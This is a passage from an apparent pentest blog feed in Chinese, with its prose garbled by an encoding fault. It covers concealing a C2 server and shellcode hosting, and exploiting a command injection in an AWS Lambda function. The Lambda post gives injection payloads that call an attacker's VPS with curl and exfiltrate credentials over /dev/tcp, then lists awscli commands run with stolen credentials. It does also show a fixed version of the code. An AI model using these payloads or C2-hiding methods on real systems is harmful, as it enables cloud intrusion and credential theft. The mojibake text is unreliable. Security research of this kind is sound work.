&lt;li&gt;å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š&lt;ul&gt;
&lt;li&gt;å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨&lt;/li&gt;
&lt;li&gt;å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€&lt;/li&gt;
&lt;li&gt;shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;å‡†å¤‡ææ–™&quot;&gt;&lt;a href=&quot;#å‡†å¤‡ææ–™&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡ææ–™&quot;&gt;&lt;/a&gt;å‡†å¤‡ææ–™&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰&lt;/li&gt;
&lt;li&gt;Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨&lt;code&gt;Slash commands&lt;/code&gt;åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;æ‰˜ç®¡shellcodeæµç¨‹&quot;&gt;&lt;a href=&quot;#æ‰˜ç®¡shellcodeæµç¨‹&quot; class=&quot;headerlink&quot; title=&quot;æ‰˜ç®¡shellcodeæµç¨‹&quot;&gt;&lt;/a&gt;æ‰˜ç®¡shellcodeæµç¨‹&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;/2021/04/06/defense-from-c2/18.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•</title>
    <link href="https://jkme.github.io/2021/04/01/aws-lambda-rce.html"/>
    <id>https://jkme.github.io/2021/04/01/aws-lambda-rce.html</id>
    <published>2021-03-31T16:00:00.000Z</published>
    <updated>2022-01-21T03:41:19.518Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ”»å‡»çš„Payloadï¼š <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚</p><h5 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç :"></a>ä¿®å¤ä»£ç :</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h3><ul><li>Lambdaå‡½æ•°ä»£ç è·¯å¾„: <code>/var/task</code></li><li>ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li><li>æ–‡ä»¶ç³»ç»Ÿ: <code>/var/task</code>åªè¯»ï¼Œ<code>/tmp</code>å¯å†™</li><li>é»˜è®¤ç”¨æˆ·: <code>sbx_userxxx</code></li><li>Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³</li><li>æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰</li></ul><p>åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨<code>awscli</code>å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡<code>awscli</code>æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º<code>Lambda</code>çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>awscli</code>æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚</p><p>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯<code>is not authorized to perform</code>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š</p><h6 id="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"><a href="#é…ç½®awså‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"></a>é…ç½®awså‘½ä»¤è¡Œå·¥å…·</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencredsè¾“å…¥è·å–åˆ°çš„AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEYå’Œå¯¹åº”åŒºåŸŸï¼Œç¼–è¾‘~/.aws/credentialsï¼Œåœ¨é…ç½®æ–‡ä»¶é‡Œé¢å¢åŠ aws_session_tokenï¼Œè®¾ç½®è·å–åˆ°çš„å¯¹åº”å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p><h6 id="è·å–function-nameã€role-name"><a href="#è·å–function-nameã€role-name" class="headerlink" title="è·å–function nameã€role name"></a>è·å–function nameã€role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ARN(Amazon Resource Name)æ˜¯AWSé‡Œé¢å”¯ä¸€èµ„æºæ ‡ç¤ºç¬¦å·ï¼ŒARNçš„æ ¼å¼å–å†³äºç‰¹å®šçš„èµ„æºï¼Œä¸€èˆ¬æ˜¯è¿™ç§æ ¼å¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-idarn:partition:service:region:account-id:resource-type&#x2F;resource-idarn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>partition</code>ï¼šèµ„æºæ‰€åœ¨åˆ†åŒº<ul><li><code>aws</code> - AWS åŒºåŸŸ</li><li><code>aws-cn</code> - ä¸­å›½åŒºåŸŸ</li><li><code>aws-us-gov</code> - AWS GovCloud (US) åŒºåŸŸ</li></ul></li><li><code>service</code>: æ ‡è¯† AWS äº§å“çš„æœåŠ¡å‘½åç©ºé—´ã€‚ä¾‹å¦‚ï¼Œs3 è¡¨ç¤º Amazon S3 èµ„æºã€‚</li><li><code>region</code>: åŒºåŸŸã€‚ä¾‹å¦‚ï¼Œus-east-2 è¡¨ç¤º ç¾å›½ä¸œéƒ¨ï¼ˆä¿„äº¥ä¿„å·ï¼‰ã€‚</li><li><code>account-id</code>: æ‹¥æœ‰èµ„æºçš„ AWS è´¦æˆ·çš„ IDï¼ˆä¸å«è¿å­—ç¬¦ï¼‰ã€‚ä¾‹å¦‚ï¼Œ123456789012ã€‚</li><li><code>resource-id</code>: èµ„æºæ ‡è¯†ç¬¦ã€‚ARN çš„è¿™ä¸€éƒ¨åˆ†å¯ä»¥æ˜¯èµ„æºçš„åç§°æˆ– IDï¼Œä¹Ÿå¯ä»¥æ˜¯èµ„æºè·¯å¾„. ä¾‹å¦‚ï¼Œ<code>user/Bob</code>è¡¨ç¤º IAM ç”¨æˆ·.</li></ul><p>åœ¨Lambdaé‡Œé¢ï¼ŒARNçš„æ ¼å¼æ˜¯å¦‚ä¸‹è¿™æ ·çš„è¡¨ç¤ºï¼š<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p><p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p><h6 id="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"><a href="#è·å–å‡½æ•°çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"></a>è·å–å‡½æ•°çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–attachçš„æƒé™æ˜ç»†"><a href="#è·å–attachçš„æƒé™æ˜ç»†" class="headerlink" title="è·å–attachçš„æƒé™æ˜ç»†"></a>è·å–attachçš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–policy-name"><a href="#è·å–policy-name" class="headerlink" title="è·å–policy name"></a>è·å–policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"><a href="#è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"></a>è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡æŸ¥è¯¢ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†ï¼Œå°±å¯ä»¥æ ¹æ®è·å–åˆ°çš„å‡­è¯æ“ä½œAWSçš„èµ„æºï¼Œæ¯”å¦‚S3ã€EC2ã€‚è¿™é‡Œçš„ç”¨æˆ·å‡­è¯æƒé™æ˜ç»†ä¸åŒ…æ‹¬attachçš„æƒé™</p><h6 id="å¸¸ç”¨çš„æŸ¥è¯¢"><a href="#å¸¸ç”¨çš„æŸ¥è¯¢" class="headerlink" title="å¸¸ç”¨çš„æŸ¥è¯¢"></a>å¸¸ç”¨çš„æŸ¥è¯¢</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencredsaws ssm describe-instance-information --profile stolencredsaws s3 <span class="token function">ls</span> --profile stolencredsaws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencredsaws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç–‘éš¾é—®é¢˜"><a href="#ç–‘éš¾é—®é¢˜" class="headerlink" title="ç–‘éš¾é—®é¢˜"></a>ç–‘éš¾é—®é¢˜</h3><ol><li><p>å½“ç¡®å®šå­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œå…ˆä½¿ç”¨äº†<code>wget</code>ï¼ŒæŸ¥çœ‹<code>cloudwatch</code>ä¹‹åå‘ç°ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤ï¼Œå½“æˆ‘ä½¿ç”¨<a href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>æµ‹è¯•çš„æ—¶å€™å‘ç°<code>curl</code>éƒ½ä¸å­˜åœ¨ã€‚è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>æ¥ä¼ è¾“æ•°æ®ï¼Œå…ˆæŠŠéœ€è¦è·å–åˆ°çš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ï¼Œç„¶åå¤–å¸¦ä¼ è¾“ã€‚</p></li><li><p>å¦å¤–ä¸€ä¸ªéšæ‚£æ˜¯DoWï¼ˆDenial of Walletï¼‰ï¼Œå› ä¸ºLambdaæ˜¯æŒ‰ç…§å‡½æ•°è°ƒç”¨æ¬¡æ•°ä»˜è´¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ‰¾åˆ°ä¸€ä¸ªLambdaçš„äº‹ä»¶è§¦å‘å™¨ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªhttpè¯·æ±‚ï¼Œå‘èµ·å¤§é‡è¯·æ±‚æ¶ˆè€—èµ„æº, å»¶ä¼¸ä¸€ä¸‹è…¾è®¯åœ¨æ¨çš„ç±»ä¼¼ä¸€ä¸ªä¸šåŠ¡åœ¨githubä¸Šæœ‰å¾ˆå¤šå¼€æºé¡¹ç›® :( ã€‚AWSå¯ä»¥å†åŠ ä¸€å±‚<code>cloudfront</code>ï¼Œç„¶åé…åˆ<code>cloudwatch</code>æˆ–è€…è´¦å•é¢„è­¦æ¥å®Œå–„ï¼Œæˆ–è€…æ·»åŠ ç”¨æˆ·è®¤è¯tokenã€‚</p></li><li><p>ä¸ºä»€ä¹ˆä¸Šé¢æˆ‘æ²¡æœ‰æå‘½ä»¤æ‰§è¡Œä¹‹ååå¼¹shellå‘¢ï¼Ÿå› ä¸ºä¸€åå¼¹æˆåŠŸä¹‹åé©¬ä¸Šæ–­å¼€ã€‚æœ€ååœ¨Lambdaçš„é…ç½®é‡Œé¢å‘ç°Lambdaæ‰§è¡Œçš„timeoutæ˜¯3sï¼Œlambdaåœ¨å»ºç«‹çš„æ—¶å€™é»˜è®¤è¿è¡Œæ—¶é—´æ˜¯3sï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæœ€å¤§15åˆ†é’Ÿã€‚</p></li><li><p>è¿˜æœ‰ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼Œå¯ä»¥ä¿®æ”¹ä»£ç è¿è¡Œç¯å¢ƒï¼Œæ²¡çœ‹å¤ªæ‡‚: <a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></p></li></ol><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">é’ˆå¯¹AWS Lambdaçš„è¿è¡Œæ—¶æ”»å‡»</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverlesså®‰å…¨ç ”ç©¶ â€” Serverlesså®‰å…¨é£é™©</a></li><li><a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li><li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li><li><a href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;æ¼æ´&quot;&gt;&lt;a href=&quot;#æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´&quot;&gt;&lt;/a&gt;æ¼æ´&lt;/h3&gt;&lt;p&gt;æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;execute_command &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg -i &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; video_url &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -y -f &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; img_format &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -ss &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; time_index &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -vframes 1 &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; WH &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; output_path
&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; shell&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ”»å‡»çš„Payloadï¼š &lt;code&gt;;curl &amp;lt;your vps&amp;gt;:&amp;lt;port&amp;gt;;&lt;/code&gt;ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚&lt;/p&gt;
&lt;h5 id=&quot;ä¿®å¤ä»£ç &quot;&gt;&lt;a href=&quot;#ä¿®å¤ä»£ç &quot; class=&quot;headerlink&quot; title=&quot;ä¿®å¤ä»£ç :&quot;&gt;&lt;/a&gt;ä¿®å¤ä»£ç :&lt;/h5&gt;&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-i&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; video_url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-y&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-f&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; img_format&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-ss&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; time_index&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-vframes&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; output_path&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h3 id=&quot;å‚¨å¤‡çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‚¨å¤‡çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;å‚¨å¤‡çŸ¥è¯†&quot;&gt;&lt;/a&gt;å‚¨å¤‡çŸ¥è¯†&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Lambdaå‡½æ•°ä»£ç è·¯å¾„: &lt;code&gt;/var/task&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ&lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;, &lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;, &lt;code&gt;AWS_SESSION_TOKEN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç³»ç»Ÿ: &lt;code&gt;/var/task&lt;/code&gt;åªè¯»ï¼Œ&lt;code&gt;/tmp&lt;/code&gt;å¯å†™&lt;/li&gt;
&lt;li&gt;é»˜è®¤ç”¨æˆ·: &lt;code&gt;sbx_userxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³&lt;/li&gt;
&lt;li&gt;æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨&lt;code&gt;awscli&lt;/code&gt;å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡&lt;code&gt;awscli&lt;/code&gt;æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º&lt;code&gt;Lambda&lt;/code&gt;çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨&lt;code&gt;awscli&lt;/code&gt;æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯&lt;code&gt;is not authorized to perform&lt;/code&gt;ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrikeçš„Stagerç‰¹å¾éšè—</title>
    <link href="https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html"/>
    <id>https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html</id>
    <published>2021-01-03T16:00:00.000Z</published>
    <updated>2022-01-21T02:37:52.292Z</updated>
    
